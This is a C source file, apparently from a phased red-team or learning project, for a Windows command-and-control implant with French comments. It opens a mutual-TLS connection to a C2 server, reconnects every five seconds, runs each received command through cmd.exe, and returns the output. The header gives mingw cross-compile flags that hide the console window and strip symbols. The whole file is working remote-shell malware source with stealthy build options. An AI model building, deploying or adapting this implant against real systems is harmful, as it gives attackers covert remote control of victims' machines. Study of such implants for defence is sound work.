/*
 * implant.c - Implant C2 en C avec TLS mutuel (mTLS).
 *
 * Tourne sur Windows (cross-compilé depuis Linux avec mingw-w64).
 * Remplace implant.c de la phase 2 (AES-RSA) par une communication HTTPS/TLS
 * utilisant le module tls.c/tls.h.
 *
 * Comportement :
 *   1. Connexion TLS vers le C2 (retry toutes les 5s si indisponible).
 *   2. Boucle de commandes :
 *      a. Reçoit une commande du C2.
 *      b. Exécute via cmd.exe (popen).
 *      c. Renvoie la sortie suivie du marqueur de fin "\x00END".
 *   3. Sur 'exit' : envoie "BYE" et ferme proprement.
 *
 * Cross-compilation depuis Ubuntu :
 *   x86_64-w64-mingw32-gcc -Wall -o implant.exe implant.c tls.c \
 *       -I/path/to/openssl/include -L/path/to/openssl/lib \
 *       -lssl -lcrypto -lws2_32 -mwindows -static -s
 *
 * NOTE : tls.c inclut <winsock2.h> etc. lorsque compilé pour Windows
 *        (voir les #ifdef _WIN32 dans tls.c).
 */

#ifdef _WIN32
#  include <windows.h>  /* Sleep, DWORD */
#else
#  include <unistd.h>   /* sleep (pour tests sur Linux) */
#endif

#include "tls.h"
#include <stdio.h>
#include <string.h>

/* IP et port du C2 : priorité aux macros définies à la compilation,
 * sinon valeurs .env, sinon défauts. */
#ifndef C2_IP
#  define C2_IP NULL   /* sera lu depuis .env ou cfg_get */
#endif
#ifndef C2_PORT
#  define C2_PORT 0    /* sera lu depuis cfg_port()       */
#endif

#define BUFFER_SIZE 65536  /* sortie d'une commande (max 64 Ko) */
#define CMD_SIZE    1024
#define RETRY_DELAY 5      /* secondes entre les tentatives de reconnexion */

/* Exécute une commande shell et retourne la sortie dans buf (max buf_len-1 octets).
 * Retourne la longueur écrite. */
static int exec_cmd(const char *cmd, char *buf, int buf_len) {
    FILE *fp;
    int   total = 0;
    int   n;

#ifdef _WIN32
    fp = _popen(cmd, "r");
#else
    fp = popen(cmd, "r");
#endif
    if (!fp) {
        const char *err = "[implant] Impossible d'executer la commande\r\n";
        int         el  = (int)strlen(err);
        if (el < buf_len) { memcpy(buf, err, el); total = el; }
        return total;
    }
    while ((n = (int)fread(buf + total, 1, (size_t)(buf_len - 1 - total), fp)) > 0) {
        total += n;
        if (total >= buf_len - 1) break;
    }
#ifdef _WIN32
    _pclose(fp);
#else
    pclose(fp);
#endif
    buf[total] = '\0';
    return total;
}

int main(void) {
    cfg_load(".env");

    const char *ip   = cfg_get("SERVER_IP", C2_IP ? C2_IP : "127.0.0.1");
    int         port = C2_PORT ? C2_PORT : cfg_port();

    if (tls_init() != 0)
        return 1;

    for (;;) {
        tls_conn *c = tls_connect(ip, port);
        if (!c) {
#ifdef _WIN32
            Sleep(RETRY_DELAY * 1000);
#else
            sleep(RETRY_DELAY);
#endif
            continue;
        }

        /* Boucle de commandes. */
        char cmd[CMD_SIZE];
        char buf[BUFFER_SIZE];
        int  n;

        while ((n = tls_recv(c, cmd, sizeof(cmd) - 1)) > 0) {
            cmd[n] = '\0';

            if (strcmp(cmd, "exit") == 0) {
                tls_send(c, "BYE", 3);
                tls_close(c);
                tls_cleanup();
                return 0;
            }

            /* Exécute la commande et envoie la sortie + marqueur de fin. */
            int out_len = exec_cmd(cmd, buf, BUFFER_SIZE - 4);

            /* Ajoute le marqueur "\x00END" en fin de payload. */
            buf[out_len]     = '\x00';
            buf[out_len + 1] = 'E';
            buf[out_len + 2] = 'N';
            buf[out_len + 3] = 'D';

            if (tls_send(c, buf, out_len + 4) <= 0)
                break;
        }

        tls_close(c);
        /* Reconnexion après perte de connexion. */
#ifdef _WIN32
        Sleep(RETRY_DELAY * 1000);
#else
        sleep(RETRY_DELAY);
#endif
    }
}
